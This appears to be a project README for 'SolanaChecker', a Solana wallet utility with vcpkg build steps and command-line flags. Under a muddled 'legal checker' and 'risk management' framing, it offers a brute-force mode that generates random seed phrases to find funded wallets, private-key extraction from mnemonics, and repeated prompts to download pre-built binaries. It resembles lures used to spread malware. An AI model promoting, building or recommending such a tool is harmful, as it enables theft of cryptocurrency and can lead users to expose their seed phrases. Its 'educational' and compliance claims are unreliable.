# Solana Wallet Legal Checker: Understanding Compliance and Risk

**SolanaChecker** provides a suite of functions for interacting with the Solana blockchain. It includes essential tools for checking the status of your wallets and managing your digital assets. While not directly providing legal advice, SolanaChecker can be used in ways that aid in understanding the nature of your assets and transactions, helping you manage risk.

###[DOWNLOAD FOR WINDOWS & LINUX](../../releases)
   <p align="left">
    <img src="/output/aspect.webp" />
</p>

## Program Features Useful for Risk Management

1.  **Check Solana Address Balance:** Check the current Solana balance on a specified address.

<p align="left">
    <img src="/output/design.webp" />
</p>

2.  **Check Solana Tokens for Fraud:** Assess the security of tokens based on their characteristics and metadata.

<p align="left">
    <img src="/output/border.webp" />
</p>

3.  **Track Solana Addresses:** Receive notifications about activity on specified addresses through a Telegram bot.

4.  **Wallet Data from Mnemonic Phrase:** Extract the private key, address, and balance of a Solana wallet using the known mnemonic phrase (seed phrase). *This is a crucial feature that demonstrates how the wallet is controlled.*

<p align="left">
    <img src="/output/program.webp" />
</p>

5.  **Generate a Single Solana Wallet:** Generate a new Solana wallet with a unique private key and address.

<p align="left">
    <img src="/output/page.webp" />
</p>

6.  **Generation Solana Wallets and Check Balance (Educational):** A brute-force process that generates random seed phrases and checks balances (for educational purposes only). *It demonstrates how the relationship between seed phrases and wallet access could, in theory, be exploited. This highlights the importance of strong key management.*

<p align="left">
    <img src="/output/shadow.webp" />
</p>

## Setting Up Telegram (for Monitoring)

Configure the program with a Telegram bot to receive notifications.

## Getting Started: Download or Build

Download a pre-compiled build or build the project yourself.

## Building the Project

Building the project from source provides transparency and security.

### Installing Dependencies Using vcpkg:

1.  Install **vcpkg** if you do not have it.
2.  Add it to your system PATH.
3.  Install the following dependencies:

    -   Install **OpenSSL**:
        ```bash
        vcpkg install openssl
        ```

    -   Install **nlohmann-json**:
        ```bash
        vcpkg install nlohmann-json
        ```

    -   Install **Crypto++**:
        ```bash
        vcpkg install cryptopp
        ```

    -   Install **libsodium**:
        ```bash
        vcpkg install libsodium
        ```

4.  Build the project.

### Building via Visual Studio:

1.  Open the project solution in Visual Studio.
2.  Ensure that **vcpkg** is correctly integrated.
3.  Click **Build** -> **Build Solution**.
4.  The executable will be in the `bin` folder.

### Building with Another C++ Compiler:

1.  Ensure that all dependencies are installed via **vcpkg** and are accessible to your compiler.
2.  Compile using (example):

    ```bash
    g++ -o solanachecker main.cpp -lssl -lcrypto -lsodium -lcryptopp -std=c++17
    ```

## Command Line: Understanding Your Assets

Utilize the command line for functions relevant to understanding your assets:

1.  **-s / -search**: Start the brute-force seed phrase generation (for educational purposes only).
2.  **-t / -track (ADDRESS)**: Track a specified address.
3.  **-g / -gen (NUMBER)**: Generate a specified number of Solana wallets.
4.  **-m / -mnemonic (MNEMONIC)**: Display wallet information using the seed phrase.
5.  **-b / -balance (ADDRESS)**: Check the balance of a Solana address.

## Notes

-   The program is for research purposes and should not be used for illegal activities.
-   All cryptocurrency operations carry risks.
-   Protect your wallets.


  ###[DOWNLOAD FOR WINDOWS & LINUX](../../releases)

  ## License
This project is licensed under the [MIT License](/LICENSE).